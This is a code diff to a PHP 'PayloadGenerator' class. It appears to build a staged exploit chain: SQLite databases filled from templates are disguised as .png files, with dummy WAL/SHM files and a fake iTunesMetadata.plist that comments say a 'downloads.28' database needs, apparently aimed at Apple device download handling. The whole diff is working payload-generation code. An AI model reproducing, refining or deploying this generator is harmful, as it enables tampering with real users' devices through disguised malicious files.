@@ -94,20 +94,41 @@ class PayloadGenerator {
         $dir2 = CACHE_DIR . "/stage2/$token2";
         if (!is_dir($dir2)) mkdir($dir2, 0755, true);
 
+        $fixedfileUrl = BASE_URL . "/cache/stage1/$token1/fixedfile";
         $blSql = $this->readTemplate(TEMPLATE_DIR . '/bl_structure.sql');
-        $blSql = str_replace('KEYOOOOOO', BASE_URL . "/cache/stage1/$token1/fixedfile", $blSql);
+        // CRITICAL: Replace BOTH ZTHUMBNAILIMAGEURL and ZURL with the payload URL
+        // The template uses 'URL_GESTALT' as placeholder for both fields
+        $blSql = str_replace('URL_GESTALT', $fixedfileUrl, $blSql);
         
         $this->createDatabaseFromSql($blSql, "$dir2/intermediate.sqlite");
         rename("$dir2/intermediate.sqlite", "$dir2/belliloveu.png");
+
+        // Create dummy WAL/SHM files (required by downloads.28)
+        file_put_contents("$dir2/belliloveu_wal.png", '');
+        file_put_contents("$dir2/belliloveu_shm.png", '');
+        
+        // Create dummy iTunesMetadata.plist
+        $metaPlist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict><key>FreeTool</key><string>Free for All</string></dict></plist>";
+        file_put_contents("$dir2/metadata.plist", $metaPlist);
 
         // 3. Final Payload
         $token3 = $this->generateToken();
         $dir3 = CACHE_DIR . "/stage3/$token3";
         if (!is_dir($dir3)) mkdir($dir3, 0755, true);
 
+        $blUrl = BASE_URL . "/cache/stage2/$token2/belliloveu.png";
+        $walUrl = BASE_URL . "/cache/stage2/$token2/belliloveu_wal.png";
+        $shmUrl = BASE_URL . "/cache/stage2/$token2/belliloveu_shm.png";
+        $metaUrl = BASE_URL . "/cache/stage2/$token2/metadata.plist";
+        
         $dlSql = $this->readTemplate(TEMPLATE_DIR . '/downloads_structure.sql');
-        $dlSql = str_replace('https://google.com', BASE_URL . "/cache/stage2/$token2/belliloveu.png", $dlSql);
-        $dlSql = str_replace('GOODKEY', $this->guid, $dlSql);
+        // Replace URL placeholders (template uses URL_DB, URL_WAL, URL_SHM, URL_METADATA)
+        $dlSql = str_replace('URL_DB', $blUrl, $dlSql);
+        $dlSql = str_replace('URL_WAL', $walUrl, $dlSql);
+        $dlSql = str_replace('URL_SHM', $shmUrl, $dlSql);
+        $dlSql = str_replace('URL_METADATA', $metaUrl, $dlSql);
+        // Replace GUID placeholder (template uses hardcoded GUID that gets replaced)
+        $dlSql = str_replace('3DBBBC39-F5BA-4333-B40C-6996DE48F91C', $this->guid, $dlSql);
 
         $this->createDatabaseFromSql($dlSql, "$dir3/final.sqlite");
         rename("$dir3/final.sqlite", "$dir3/payload.png");
